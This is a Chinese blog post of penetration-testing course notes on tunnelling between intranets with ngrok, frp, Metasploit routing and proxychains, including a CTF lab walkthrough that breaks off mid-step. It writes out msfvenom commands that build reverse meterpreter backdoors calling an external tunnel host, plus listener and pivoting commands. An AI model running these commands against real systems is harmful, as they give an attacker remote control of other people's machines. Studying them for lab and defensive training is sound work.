<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="70-内网安全-域横向内网漫游Socks代理隧道技术">
<meta property="og:type" content="article">
<meta property="og:title" content="70-内网安全-域横向内网漫游Socks代理隧道技术">
<meta property="og:url" content="http://example.com/2023/04/28/70-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/index.html">
<meta property="og:site_name" content="HVVL404">
<meta property="og:description" content="70-内网安全-域横向内网漫游Socks代理隧道技术">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928152908376-69296813.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154605586-1580443015.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154616427-1426783484.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154628822-425162837.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154642808-1104507637.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154652942-949756817.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154714821-995750990.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154747885-1664137149.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154810780-1403521999.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154824447-1265864719.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154838446-1413645975.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154902185-521072267.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154948947-6901926.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928155812015-1406516529.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928155823839-811696181.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928155837778-513331035.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928160008699-436444639.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928160142044-21242600.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928160206101-1430755926.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928160217474-1157825274.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930141243430-677363159.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930141449207-1230814803.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930141500795-1559381656.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930141511748-671128756.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930141523533-1959493924.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930141532987-534456328.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930141543807-466011482.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930141716374-784625011.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930142534997-1247977894.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930142607310-962531911.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930142621255-1107109770.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930142641436-60577561.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930142701998-1201811730.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930142717416-942665604.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930142745475-732674041.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930143503418-457556209.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930144256720-49560385.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930144507023-640436449.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930144522332-438108210.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930144537624-635637373.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145114300-1311257096.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145129341-666159460.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145143826-1589979686.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145159105-1707108491.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145212291-407414830.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145426165-707940301.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145436555-605100071.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145450819-992797278.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145527310-1768966767.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145859506-196828276.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145941559-446957974.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930150110194-182145882.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930150433136-2086977233.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930150452756-2132412133.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930150505424-1773934739.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930150513331-350490908.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930150524993-983993102.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930150816003-676531260.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930151108406-1982534252.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930151126265-242510343.png">
<meta property="article:published_time" content="2023-04-28T07:42:59.868Z">
<meta property="article:modified_time" content="2023-05-04T12:14:00.269Z">
<meta property="article:author" content="HVVL">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928152908376-69296813.png">

<link rel="canonical" href="http://example.com/2023/04/28/70-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>70-内网安全-域横向内网漫游Socks代理隧道技术 | HVVL404</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">HVVL404</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="house fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="categories fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/28/70-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="HVVL">
      <meta itemprop="description" content="欢迎来到我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="HVVL404">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          70-内网安全-域横向内网漫游Socks代理隧道技术
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-04-28 15:42:59" itemprop="dateCreated datePublished" datetime="2023-04-28T15:42:59+08:00">2023-04-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-05-04 20:14:00" itemprop="dateModified" datetime="2023-05-04T20:14:00+08:00">2023-05-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/" itemprop="url" rel="index"><span itemprop="name">小迪安全（内网篇）</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>70-内网安全-域横向内网漫游Socks代理隧道技术</p>
<span id="more"></span>

<p><strong>必要基础知识点：</strong></p>
<p>1.内外网简单知识</p>
<ul>
<li>内网ip地址是私有ip地址（10&#x2F;8, 172.16&#x2F;12 , 192.168&#x2F;16），除此之外就是外网ip。</li>
</ul>
<p>2.内网1和内网2通信问题</p>
<ul>
<li>两个不同的内网的主机想要通过CS或者MSF等工具实现控制或者通讯是不可能的，必须要借助代理。</li>
</ul>
<p>3.正反向协议通信连接问题</p>
<ul>
<li>正向：控制端主动去连接被控端</li>
<li>反向：被控端主动去连接控制端</li>
<li>为什么要区分正向和反向？–因为如果控制端是外网主机，被控端是内网主机，就相当于控制端有一个唯一的IP地址（比如103.12.4.11），通过这个IP地址就可以找到控制端，而在内网的被控端（比如192.168.23.36），你通过控制端主动去找是找不到的，因为这个内网IP地址并不是唯一的，可能很多内网都用了这个IP地址，你根本没法找。此时就需要反向连接了，让内网的被控端主动去找外网的控制端。</li>
</ul>
<p>4.内网穿透代理隧道技术说明</p>
<ul>
<li>隧道主要解决流量分析工具、流量监控工具、防火墙等相关工具的过滤问题</li>
<li>代理主要解决网络的连通性问题</li>
</ul>
<p><strong>本课主要讲解内网渗透-横向渗透-穿透-代理相关知识点：</strong></p>
<ul>
<li>代理技术主要解决3种问题：内网有外网，内网有过滤（防火墙），内网无外网（单纯主机服务器，无网络）</li>
<li>代理主要分为：正向代理和反向代理（以下案例均有涉及）</li>
<li>代理相关工具：nps、frp、ngrok、reGeorg、sockscap65、earthworm、proxifier、proxychains<ul>
<li>案例涉及工具：frp、ngrok、sockscap65、proxifier、proxychains</li>
<li>nps、reGeorg工具：案例未涉及，可自行学习</li>
<li>EarthWorm(简称EW)：已永久停止更新，本课不再讲解。</li>
</ul>
</li>
</ul>
<p><strong>本课重点：</strong></p>
<ul>
<li>案例1：内网穿透Ngrok测试演示-两个内网通讯上线</li>
<li>案例2：内网穿透Frp自建跳板测试-两个内网通讯上线</li>
<li>案例3：CFS三层内网漫游安全测试演练-某CTF线下2019</li>
</ul>
<p><strong>案例1：内网穿透Ngrok测试演示-两个内网通讯上线</strong></p>
<p>实验环境：两个不同的内网(有网络)实现穿透控制</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928152908376-69296813.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1.注册-购买-填写-确认</span><br><span class="line"> </span><br><span class="line">国外地址：https://ngrok.com/</span><br><span class="line">国内地址：https://www.ngrok.cc/</span><br><span class="line">国外的比较卡慢，用国内的就行&lt;br&gt;2022.01.18：国内的太麻烦了，亲测还是国外的好用，另外，国内有一款花生壳应该也不错，可以试试</span><br><span class="line">协议：http 本地端口：192.168.76.132:4444</span><br><span class="line"> </span><br><span class="line">2.测试：内网1执行后门-免费主机处理-内网2监听-内网2接受器</span><br><span class="line"> </span><br><span class="line">启动ngrok客户端</span><br><span class="line">./sunny clientid &lt;隧道id&gt;</span><br><span class="line"> </span><br><span class="line">在kali下生成后门（因为选择的是http协议，所以这里是reverse_http），并把后门test.exe复制到windows7</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_http lhost=xiaodisec.free.idcfengye.com lport=80 -f exe -o test.exe</span><br><span class="line"> </span><br><span class="line">配置并监听（一旦xiaodisec.free.idcfengye.com有流量，就发给本地192.168.76.132:4444）</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.76.132</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>案例演示</p>
<p>&lt;1&gt;注册，登录</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154605586-1580443015.png" alt="img"></p>
<p>&lt;2&gt;点击ngrok客户端下载</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154616427-1426783484.png" alt="img"></p>
<p>&lt;3&gt;根据操作系统版本选择对应的客户端下载（我们用的kali作为内网肉鸡,下载的就是linux版本）</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154628822-425162837.png" alt="img"></p>
<p>&lt;4&gt;开通隧道（仅做测试用，使用免费的即可，免费的不稳定容易断，实战中建议使用收费版）</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154642808-1104507637.png" alt="img"></p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154652942-949756817.png" alt="img"></p>
<p>&lt;5&gt;本地端口配置的是内网肉鸡kali的IP:Port</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154714821-995750990.png" alt="img"></p>
<p>&lt;6&gt;开两台虚拟机模拟内外网，其中kali模拟内网肉鸡，windows7模拟外网主机（后面几步用msf生成后门，再用另一台电脑来执行这个后门，两台电脑实现互联）</p>
<p>&lt;7&gt;将ngrok客户端传到内网肉鸡 kali上，解压缩</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154747885-1664137149.png" alt="img"></p>
<p>&lt;8&gt;启动</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154810780-1403521999.png" alt="img"></p>
<p>&lt;9&gt;隧道状态变为online</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154824447-1265864719.png" alt="img"></p>
<p>&lt;10&gt;生成后门</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154838446-1413645975.png" alt="img"></p>
<p>&lt;11&gt;把后门test.exe复制到windows7</p>
<p>&lt;12&gt;配置并监听（一旦xiaodisec.free.idcfengye.com有流量，就发给本地192.168.76.132:4444）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.76.132</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>&lt;13&gt;在windows7上双击启动后门test.exe</p>
<p>&lt;14&gt;kali上监听到会话，ngrok客户端监听到流量</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154902185-521072267.png" alt="img"></p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928154948947-6901926.png" alt="img"></p>
<p><strong>案例2-内网穿透Frp自建跳板测试-两个内网通讯上线</strong></p>
<p>FRP说明文档：<a target="_blank" rel="noopener" href="https://gofrp.org/docs/">https://gofrp.org/docs/</a></p>
<p>Frp工具：开源免费，自行搭建，方便修改，成本低，使用多样化，防止隐私泄露。而Ngrok工具使用的是别人的服务器，容易泄露隐私数据。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">1.服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）</span><br><span class="line">FRP下载地址：https://github.com/fatedier/frp/releases</span><br><span class="line">服务器修改配置文件frps.ini：</span><br><span class="line">[common]</span><br><span class="line">bind_port = 6677</span><br><span class="line">启动服务端：</span><br><span class="line">./frps -c ./frps.ini</span><br><span class="line"> </span><br><span class="line">2.控制端-下载-解压-修改-启动</span><br><span class="line">控制端修改配置文件frpc.ini：</span><br><span class="line">[common]</span><br><span class="line">server_addr = 你的云主机ip</span><br><span class="line">server_port = 6677 #frpc工作端口，必须和上面frps保持一致</span><br><span class="line">[msf]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 5555 #转发给本机的5555</span><br><span class="line">remote_port = 6000 #服务端用6000端口转发给本机</span><br><span class="line"> </span><br><span class="line">启动客户端(kali)：</span><br><span class="line">./frpc -c ./frpc.ini</span><br><span class="line"> </span><br><span class="line">生成后门：</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=你的公网ip lport=6000 -f exe -o frp.exe</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 127.0.0.1</span><br><span class="line">set LPORT 5555</span><br><span class="line">exploit</span><br><span class="line"> </span><br><span class="line">3.靶机运行frp即可</span><br></pre></td></tr></table></figure>

<p>案例演示</p>
<p>1.服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">服务器修改配置文件frps.ini：</span><br><span class="line">[common]</span><br><span class="line">bind_port = 6677</span><br><span class="line">启动服务端：</span><br><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure>

<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928155812015-1406516529.png" alt="img"></p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928155823839-811696181.png" alt="img"></p>
<p>2.控制端-下载-解压-修改-启动</p>
<p>&lt;1&gt;控制端修改配置文件frpc.ini</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 你的云主机ip</span><br><span class="line">server_port = 6677 #frpc工作端口，必须和上面frps保持一致</span><br><span class="line">[msf]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 5555 #转发给本机的5555</span><br><span class="line">remote_port = 6000 #服务端用6000端口转发给本机</span><br></pre></td></tr></table></figure>

<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928155837778-513331035.png" alt="img"></p>
<p>&lt;2&gt;启动客户端(kali)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure>

<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928160008699-436444639.png" alt="img"></p>
<p>此时服务端收到端口连接</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928160142044-21242600.png" alt="img"></p>
<p>&lt;3&gt;生成后门</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=你的公网ip lport=6000 -f exe -o frp.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928160206101-1430755926.png" alt="img"></p>
<p>&lt;4&gt;配置监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 127.0.0.1</span><br><span class="line">set LPORT 5555</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210928160217474-1157825274.png" alt="img"></p>
<p>3.将后门文件拷贝到靶机，运行。如上图所示，监听到会话。</p>
<p><strong>案例3：CFS三层内网漫游安全测试演练-某CTF线下2019</strong></p>
<p>来源2019某CTF线下赛真题内网结合WEB攻防题库，涉及WEB攻击，内网代理路由等技术，每台服务器存在一个Flag,获取每一个Flag对应一个积分，获取三个Flag结尾。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">Target1（centos7 x64）：</span><br><span class="line">探针目标-利用WEB漏洞(TP5_RCE)-获取webshell权限-获取Flag-Target2</span><br><span class="line"> </span><br><span class="line">1.生成后门：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.76.132 LPORT=1111 -f elf &gt;t1.elf</span><br><span class="line"> </span><br><span class="line">2.接受反弹：</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.76.132</span><br><span class="line">set LPORT 1111</span><br><span class="line">exploit</span><br><span class="line"> </span><br><span class="line">3.信息收集及配置访问</span><br><span class="line">获取网络接口：run get_local_subnets</span><br><span class="line">查看路由地址：run autoroute -p</span><br><span class="line">添加路由地址：run autoroute -s 192.168.22.0/24</span><br><span class="line">开启本地代理：</span><br><span class="line">use auxiliary/server/socks4a</span><br><span class="line">set srvport 2222</span><br><span class="line">exploit</span><br><span class="line"> </span><br><span class="line">4.利用本地代理接口访问测试</span><br><span class="line">设置浏览器代理进行访问测试</span><br><span class="line">linux：</span><br><span class="line">配置proxychains（代理工具）后调用工具探针Target2</span><br><span class="line">/etc/proxychains.conf</span><br><span class="line">socks4 192.168.76.132 2222（在配置文件中添加）</span><br><span class="line">proxychains4 nmap -sT -Pn 192.168.22.0/24 